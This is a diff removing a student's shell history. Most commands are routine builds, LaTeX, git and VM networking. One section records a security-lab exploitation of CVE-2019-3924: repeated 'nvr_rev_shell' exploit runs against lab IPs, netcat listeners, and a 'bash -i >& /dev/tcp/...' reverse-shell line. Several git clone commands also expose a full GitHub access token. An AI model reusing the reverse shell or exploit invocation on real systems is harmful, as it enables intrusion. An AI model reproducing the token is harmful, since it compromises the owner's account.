@@ -1,3149 +1,3 @@
-ls
-v compile_commands.json
-sudo pacman -S npm
-v compile_commands.json
-v compile_commands.json
-sudo pacman -Rns npm
-\rm -rf .npm
-la
-j parrale
-j parallel
-ls
-./compile.sh -d
-v src/integrate_parallel.cpp
-ls
-ls co
-ls config
-ls bin
-la
-\rm Projects
-la
-convim
-convim
-la
-v src/integrate_parallel.cpp
-cd /drive/Projects/ucu/acs/lab4-parallel-integral-husiev-opyr-zaletskyi
-./compile.sh -d
-./compile.sh -c
-ls
-\rm -r cmake-* *build*
-./compile.sh -d
-v src/integrate_parallel.cpp
-convim
-echo $pwd
-echo $PWD
-cd $PWD
-cd $PWD
-./compile.sh -d
-v src/integrator.cpp
-htop
-convim
-killall luals
-killall lua-ls
-killall lua-language-server
-convim
-convim
-convim
-convim
-convim
-convim
-convim
-convim
-convim
-j parallel
-v src/integrator.cpp
-v src/integrator.cpp
-v src/integrator.cpp
-v src/integrator.cpp
-v src/integrator.cpp
-killall lua-language-server
-killall lua-language-server
-v src/integrator.cpp
-convim
-killall lua-language-server
-convim
-killall lua-language-server
-killall lua-language-server
-v src/integrator.cpp
-v src/integrator.cpp
-v src/integrator.cpp
-v src/integrator.cpp
-v src/integrator.cpp
-v src/integrator.cpp
-v src/integrator.cpp
-j cv
-j pers
-cd Drive
-cd Projects
-s
-ls
-cd Life
-ls
-cd cv
-ls
-ll
-j pet
-j pers
-j proj
-j proj
-ls
-cd Personal
-ls
-cd pet.nvim
-ls
-v README.md
-git add .
-git commit -m "Update API info in readme"
-git push
-o main.pdf
-v main.tex
-lvim main.tex
-lvim main.tex
-rubber-info
-v dotfiles/scripts/install_arch.sh
-convim
-ls
-v Dockerfile
-killall lua-language-server
-ls
-podman run --workdir /app --ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium pdflatex
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium pdflatex
-ls
-\rm texput.log
-v pdflatex.sh
-chmod +x pdflatex.sh
-mv pdflatex.sh ~/dotfiles/scripts
-convim
-lvim main.tex
-killall knap
-lvim main.tex
-killall pdflatex.sh
-killall pdflatex
-killall pdflatex
-ls
-v texput.log
-lvim main.tex
-lvim main.tex
-killall lua-language-server
-v Dockerfile
-killall nvim
-killall nvim
-v Dockerfile
-pdflatex.sh -h
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr --help
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr search wallpaper.sty
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr info wallpaper.sty
-v Dockerfile
-v dotfiles/scripts/install_arch.sh
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr info fontawesome5
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium tlmgr info hyphenat
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium rubber-info
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium rubber
-podman build --name latex
-podman build --label latex
-podman build . --label latex
-j scri
-v pdflatex.sh
-lvim main.tex
-convim
-j scri
-mv pdflatex.sh latex.sh
-chmod +x latex.sh
-lvim main.tex
-convim
-podman list -a
-podman list
-podman image list
-podman image rm 1033cd59637c
-podman build . --label tex
-j scri
-v latex.sh
-mv latex.sh tex.sh
-lvim main.tex
-podman image list
-alias cppbuild
-podman build . -t tex
-lvim main.tex
-podman ps -a
-podman rm -a
-podman stop -a 
-v tex.sh
-podman rm -a
-v tex.sh
-podman stop -a 
-podman rm -a
-podman ps -a
-killall nvim
-podman stop -a 
-podman rm -a
-ls
-cat texput.log
-lvim main.tex
-cat texput.log
-cat texput.log
-ls
-cat missfont.log
-cat main.log
-ll
-convim
-killall nvim
-lvim main.tex
-convim
-lvim main.tex
-podman ps -a
-podman stop -a --force
-podman rm -a --force
-ll
-lvim main.tex
-ll
-podman rm -a --force
-lvim main.tex
-ll
-ll
-podman rm -a --force
-podman run --workdir /app -ti --rm -v .:/app docker.io/kjarosh/latex:2024.4-medium rubber-info
-v Dockerfile
-v Dockerfile
-podman build . -t tex
-tex.sh rubber
-v tex.sh
-v tex.sh
-tex.sh ls
-v tex.sh
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-tex.sh ls
-v Dockerfile
-podman build . -t tex
-v tex.sh
-tex.sh ls
-tex.sh ls -l
-lvim main.tex
-podman ps -a
-podman rm -a --force
-v tex.sh
-v Dockerfile
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-v Dockerfile
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-lvim main.tex
-v Dockerfile
-podman build . -t tex
-v Dockerfile
-podman build . -t tex
-tex.sh rubber-info
-tex.sh ls ~/.local/bin
-tex.sh sh
-v Dockerfile
-podman build . -t tex
-tex.sh rubber-info
-v Dockerfile
-podman build . -t tex
-tex.sh tlmgr info enumitem
-kil
-killall nvim
-killall knap
-killall lua-language-server
-lvim main.tex
-ll
-o main.pd
-o main.pdf
-o .
-killall nvim
-podman ps -a
-podman rm -a --force
-lvim main.tex
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman attach 6ff142435171
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-lvim main.tex
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-j scr
-v tex.sh
-podman rm -a
-podman rm -a --force
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman inspect --format "{{.Config.Labels}}" 539d94260508
-j scr
-v tex.sh
-podman inspect 539d94260508 --format "{{.State.ExitCode}}"
-podman inspect 539d94260508 --format "{{.Config.Cmd}}"
-podman inspect 539d94260508 --format "{{.Config.Entrypoint}}"
-podman inspect 539d94260508 --format "{{.Config.Labels}}"
-podman ps -a
-podman ps -a
-podman rm -a --force
-v Dockerfile
-lvim main.tex
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-ls
-cp main.tex
-cp main.tex renesas.tex
-lvim renesas.tex
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman rm -a --force
-podman ps -a
-podman ps -a
-podman ps -a
-wpodman rm -a --force
-podman rm -a --force
-podman rm -a --force
-convim
-lvim renesas.tex
-podman rm -a --force
-podman rm -a --force
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman rm -a --force
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-podman rm -a --force
-podman ps -a
-killall lua-language-server
-v texput.log
-ls
-v renesas.log
-ls
-v missfont.log
-convim
-lvim renesas.tex
-podman ps -a
-podman ps -a
-podman ps -a
-podman ps -a
-convim
-lvim renesas.tex
-\rm renesas.tex renesas.out renesas.aux
-la
-\rm renesas.log
-o renesas.pdf
-lvim main.
-lvim main.tex
-po
-podman ps -a
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-j app
-ls
-o ./ExcalidrawDocker.desktop
-podman ps -a
-j cv
-ls
-v renesas.pdf
-cp main.tex renesas.tex
-lvim renesas.tex
-\rm renesas.tex
-j cv
-mv renesas.pdf husiev_renesas.pdf
-podman network list
-sudo virsh net-autostart default
-sudo virsh net-start default
-j ucu
-ls
-j proj
-j ucu
-cd ucu
-ls
-j pro
-j ucu
-;s
-ls
-mkdir security
-cd security
-mkdir lab1
-cd lab1
-v main.cpp
-mkdir src
-mv main.cpp src
-v CMakeLists.txt
-v CMakeLists.txt
-mkdir poc
-mkdir poc/cve_2019_3924
-mv src CMakeLists.txt poc/cve_2019_3924
-ls
-ls poc/cve_2019_3924
-virsh net-list
-virsh net-info --network default
-cd Downloads
-unzip radyk.zip
-ls
-\rm radyk.zip
-cd lab5-threadpool-integral-semsichko_sen_pakholok
-ls
-o Ѓ�ву�т_thread_pool.pdf
-ranger
-ls
-v readme.md
-mkdir build
-cd build
-cmake ..
-cmake --build .
-v rea
-cd ..
-v readme.md
-ls
-cd ..
-ls
-v CMakeLists.txt
-cd -
-cmake --install .
-cd -
-v CMakeLists.txt
-ls
-cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
-cppbuild lab5check
-cppcompile lab5check -p
-ls
-ls bin
-ls
-ls data
-cppcompile lab5check --s="1 data/func1.cfg 3 7"
-cppcompile lab5check --s="3 data/func3.cfg 3 7"
-v compile.
-v compile.sh
-alias cppcompile
-setarch `uname -m` -R podman run --rm -ti -v .:/app/project:z lab5check --s="3 data/func3.cfg 3 5"
-zshrc
-v ThreadPool.hpp
-v integrate_parallel_tpool.cpp
-cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/integral/test_integral.py .
-python test_integral.py tpool -C -s -k
-v test_integral.py
-python test_integral.py tpool -C -s -k
-python test_integral.py tpool -C -s -k
-python test_integral.py tpool -C -s -k
-j cpp-
-v compile.sh
-j template
-j template
-j template
-j acs ass
-cd /drive/Projects/ucu/acs/assistance
-ls
-cd template_cpp
-ls
-v compile.sh
-ls
-ls
-python runner.py 2 3 4
-ls
-v add_threadpools_cpp/integrate_simple_tpool.cpp
-ls
-v add_threadpools_cpp/integrate_simple_tpool.cpp
-v CMakeLists.txt
-ls bin
-ls cmake-build-pipeline
-python test_integral.py tpool -C -s -k -h
-python test_integral.py tpool -C -s -k -n simple_tread_pool
-python test_integral.py tpool -C -s -k -n simple_tread_pool
-v temp/py.py
-cd temp
-python -m venv venv
-source venv/bin/activate
-pip install scipy
-v temp/py.py
-v py
-v py.py
-\rm tmp1.py
-v py.py
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u %u @@
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-j appl
-ls
-v net.mullvad.MullvadBrowser.desktop
-xdg-open net.mullvad.MullvadBrowser.desktop
-gio launch net.mullvad.MullvadBrowser.desktop
-o .
-o net.mullvad.MullvadBrowser.desktop
-alias i
-alias o
-zshrc
-xdg-open net.mullvad.MullvadBrowser.desktop
-v net.mullvad.MullvadBrowser.desktop
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u %u @@
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u %u @@
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u %u @@
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser @@u rad1an @@
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-sudo ip link add br0 type bridge
-sudo ip addr add 192.168.0.1/24 dev br0
-sudo ip link set br0 up
-ip addr
-sudoedit /etc/qemu/bridge.conf
-sudo ip link set br0 down
-sudo ip link remove br0
-sudo ip link del br0
-ip addr
-ip addr
-sudo ip addr add 192.168.0.8/24 dev wlan0
-sudo ip addr del 192.168.0.8/24 dev wlan0
-ip addr
-ping 192.168.122.107
-ping 192.168.100.229
-ping 192.168.100.15
-ping 192.168.122.107
-ping 192.168.122.107
-ping 192.168.100.15
-virsh brctl show
-_brctl show
-ip addr
-brctl show
-brctl show
-yay brctl
-virsh net-dhcp-leases network
-virsh net-dhcp-leases
-virsh net-dhcp-leases --network
-virsh net-dhcp-leases --network network
-virsh net-dhcp-leases --h
-virsh net-dhcp-leases --help
-virsh net-list
-virsh net-list
-virsh net-list
-virsh net-list
-virsh net-list
-sudo virsh net-list
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-sudo virsh net-list --all
-sudo virsh net-dumpxml network
-sudo virsh net-dhcp-leases network
-sudo virsh net-dhcp-leases network
-git clone https://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@github.com/anton7811/cybersec20251.git tmp
-git clone https://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@github.com/anton7811/cybersec20251.git tmp
-git clone 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@github.com/anton7811/cybersec20251.git tmp
-v key.txt
-git clone https://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@github.com/anton7811/cybersec20251.git tmp
-EMAIL=husiev.pn@ucu.edu.ua USERNAME=husiev.pn git clone https://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@github.com/anton7811/cybersec20251.git tmp
-git clone https://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@github.com/anton7811/cybersec20251.git tmp
-\rm key.txt
-j securo
-j secur
-ls
-cd lab1
-ls
-v poc/cve_2019_3924/src/main.cpp
-ls
-cd poc
-ls
-cd cve_2019_3924
-ls
-v CMakeLists.txt
-cd ../..
-ls
-la
-cd -
-v CMakeLists.txt
-v src/main.cpp
-cd -
-ls
-unzip tenable\ routeros\ c5d42403135e7d826fbddd85b788401b0f40d90d\ common.zip
-ls
-\rm tenable\ routeros\ c5d42403135e7d826fbddd85b788401b0f40d90d\ common.zip
-ls
-mkdir common
-mv *pp common
-ls
-cd -
-ls
-mkdir build
-cd build
-cmake ..
-cmake --build .
-cd -
-cd ../..
-v common/session.
-v common/session.cpp
-cd -
-v CMakeLists.txt
-v CMakeLists.txt
-cd build
-cmake --build .
-cmake --build .
-v src/main.cpp
-v CMakeLists.txt
-v CMakeLists.txt
-j cpp-
-v CMakeLists.txt
-cmake --build .
-v src/main.cpp
-ls
-ls build
-ls
-ls
-ls build
-./build/nvr_rev_shell
-./build/nvr_rev_shell -h
-v src/main.cpp
-v src/main.cpp
-pwd | wl-copy
-diff /drive/Files/Downloads/lab1/exploit_code/src/main.cpp src/main.cpp
-v src/main.cpp
-v main.cpp
-v src/main.cpp
-cmake --build .
-./nvr_rev_shell -h
-ping 192.168.122.104
-nc
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.104 --listening_port 1337
-mv src/main.cpp src/main_original.cpp
-cp /drive/Files/Downloads/lab1/exploit_code/src/main.cpp .
-cmake --build .
-mv main.cpp src
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.104 --listening_port 1337
-v src/main.cpp
-mv src/main.cpp src/main_petro.cpp
-cp src/main_original.cpp src/main.cpp
-cmake --build .
-v src/main.cpp
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.104 --listening_port 1337
-cp src/main_petro.cpp src/main.cpp
-v src/main.cpp
-cp /drive/Files/Downloads/lab1/exploit_code/passwords.txt build
-v src/main.cpp
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.104 --listening_port 1337
-sudo pacman -S nc
-nc
-netcat
-sudo pacman -S netcat
-nc -lvp 1337
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.101 --listening_port 1337
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.101 --listening_port 1337
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.248 --listening_ip 192.168.122.101 --listening_port 1337
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.122.101 --listening_port 1337
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.122.101 --listening_port 1337
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.122.101 --listening_port 1337
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.122.101 --listening_port 1337
-nc -lvp 1337
-nc -lvnp 1337
-nc -h
-nc -lvp 1337
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-nc -lvp 1337
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-nc -h
-sudo pacman -Rns netcat
-sudo pacman -Rns gnu-netcat
-sudo pacman -S netcat
-nc -lvp 1337
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-nc -lvp 1337
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-bash -i >& /dev/tcp/192.168.0.100/1337 0>&1
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-cmake --build .
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-nc -lvp 1337
-./nvr_rev_shell --proxy_port 8291 --proxy_ip 192.168.122.107 --target_port 80 --target_ip 192.168.100.247 --listening_ip 192.168.0.210 --listening_port 1337
-tcpdump -s 0 -i lo -w attack_capture.pcap
-sudo pacman -S tcpdump
-tcpdump -s 0 -i lo -w attack_capture.pcap
-sudo tcpdump -s 0 -i lo -w attack_capture.pcap
-ls
-\rm attack_capture.pcap
-ls
-scp nvr_rev_shell kali@192.164.122.104:/home/kali/nvr_rev_shell
-ls
-v nvr_rev_shell
-hexdump -C nvr_rev_shell | wl-copy
-v bin.hex
-killall neovim
-killall nvim
-xxd /bin/ls | wl-copy
-xxd nvr_rev_shell | wl-copy
-cp nvr_rev_shell ~/Downloads/tmp
-cp /drive/Projects/ucu/security/lab1 ~/Downloads/tmp/lab1
-cp /drive/Projects/ucu/security/lab1 ~/Downloads/tmp/lab1 -r
-nc -lvp 1337
-flag.txt
-v flag.txt
-/usr/bin/flatpak run --branch=stable --arch=x86_64 --command=mullvad-browser --file-forwarding net.mullvad.MullvadBrowser
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-ping duck.com
-ping duck.com
-v README.md
-lvim README.md
-yay winbox
-flatpak search winbox
-flatpak install winbox
-yay winbox
-flatpak list --system | grep win
-flatpak list --system | grep Win
-flatpak uninstall com.mikrotik.WinBox
-lvim README.md
-cp src/main.cpp src/main_petro.cpp
-cp src/main_original.cpp src/main.cpp
-v src/main.cpp
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp src/main_original.cpp
-cp src/main_petro.cpp src/main.cpp
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-v src/main.cpp
-cp src/main_original.cpp src/main.cpp
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main_petro.cpp src/main.cpp
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main_original.cpp src/main.cpp
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-sudo rmmod nbd
-yay virtualbox-fuse
-yay vbox-fuse
-yay virtual fuse
-yay vdfuse
-sudo vdfuse -a -f Downloads/U18f_use.vdi /mnt
-ls /mnt
-mkdir U18_mnt
-sudo mount -o loop /mnt/Parition1 U18_mnt
-ls /mnt
-sudo mount -o loop /mnt/Partition1 U18_mnt
-sudo vdfuse -a -f Downloads/U18f_use.vdi /mnt
-sudo umount /mnt
-sudo vdfuse -a -f Downloads/U18f_use.vdi /mnt
-sudo mount -o loop /mnt/Partition1 U18_mnt
-yay -R vdfuse
-yay -Rns qt6-scxml sdl12-compat virtualbox-host-modules-arch virtualbox virtualbox-sdk
-ls
-qemu-img convert -O raw Downloads/U18f_use.vdi U18_mnt
-\rm U18_mnt -r
-qemu-img convert -O raw Downloads/U18f_use.vdi U18_mnt
-v src/main.cpp
-ls
-losetup --find --show U18_mnt
-sudo losetup --find --show U18_mnt
-lsblk
-sudo mount /dev/loop0 /mnt
-ls
-\rm U18_mnt
-qemu-img convert -f vdi -O raw Downloads/U18f_use.vdi U18.img
-ls
-\rm U18.img
-qemu-img convert -f vdi -O raw Downloads/U18f_use.vdi /gamessd/U18.img
-sudo losetup --find --show /gamessd/U18.img
-sudo mount /dev/loop1 /mnt
-lsblk
-mount /gamessd/U18.img /mnt
-sudo mount /gamessd/U18.img /mnt
-ls /gamessd/U18.img
-lsblk
-shai remove loop0 and loop1
-lsblk
-\rm -r /gamessd/U18.img
-cp src/main_original.cpp src/main.cpp
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-v src/main.cpp
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-cp src/main.cpp ~/Downloads/tmp/lab1/poc/cve_2019_3924/src
-\rm src/main_*
-ls
-ls src
-cd ..
-cd ..
-ls
-v common/session.cpp
-j -
-;s
-ls
-cd cve_2019_3924
-v R
-ls
-cd -
-cd ..
-ls
-ls img
-v img/README.md
-cd poc/cve_2019_3924
-ls
-diff src/main.cpp src/main_original.cpp
-v src/main_original.cpp
-v src/main.cpp
-diff src/main.cpp src/main_original.cpp
-mv img/flag.txt img/chr_config.txt img/README.md .
-v README.md
-ls
-v common/LICENSE
-cp ~/Drive/Projects/ucu/acs/assistance/template_cpp/.gitignore .
-v .gitignore
-cd poc/cve_2019_3924
-ls
-\rm -r build
-cd -
-git init
-git add .
-git status
-git commit -m "Add working stuff"
-cd ../..
-mv security sec
-cd sec/lab1
-ls
-git push --set-upstream git@github.com:rhusiev-student/s6_sec_lab1.git main
-ls
-v chr_config.txt
-ls
-v ip_a_ubuntu.txt
-v README.md
-git add .
-git commit -m "Add ip a of ubuntu to readme"
-git push
-v README.md
-git add .
-git commit -m "Add essay to readme"
-git push
-j cpp
-j cpp
-j ucu
-lsu
-ls
-cd cpp
-ls
-mkdir s6_cpp_lab1
-cd s6_cpp_lab1
-ls
-cppproj
-ls
-la
-v
-cd ..
-git clone git@github.com:ucu-cs/lab1-ratio-zaletskyi_husiev.git
-\rm -r lab1-ratio-zaletskyi_husiev/*
-la lab1-ratio-zaletskyi_husiev/
-\rm -r lab1-ratio-zaletskyi_husiev/.github
-cp s6_cpp_lab1/* lab1-ratio-zaletskyi_husiev -r
-ls s6_cpp_lab
-ls s6_cpp_lab1
-ls s6_cpp_lab1 -a
-la lab1-ratio-zaletskyi_husiev/
-\rm -r s6_cpp_lab1
-cd lab1-ratio-zaletskyi_husiev
-ls
-v src/QTheStubborn.cpp
-./compile.sh -d
-ls
-ls cmake-build-debug
-cpplsp
-./compile.sh -d
-./compile.sh -d
-git status
-git add .
-git commit -m "Add a backbone"
-git push
-update
-flatpak --user update -y && flatpak update -y && tldr --update
-yay --noconfirm
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-lsusb
-cd Arduino/Projects
-ls
-git clone https://github.com/arashjafari/audio-to-arduino.git
-cd audio-to-arduino
-python -m venv venv
-source venv/bin/activate
-pip install requirements.txt -r
-pip install -r requirements.txt
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3
-ls
-mv audio-to-arduino.py audio_to_arduino.py
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 -h
-python audio_to_arduino.py --help
-python audio_to_arduino.py -h
-python audio_to_arduino.py
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 480 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 960 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 1920 --max-size 256
-j integ
-v src/functions.cpp
-j lab4
-ls
-o .
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 480 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 240 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 120 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 20 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 30 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-85175.mp3 --tempo 60 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 60 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 30 --max-size 48
-python audio_to_arduino.py ~/Downloads/cat-meow-6226.mp3 --tempo 20 --max-size 48
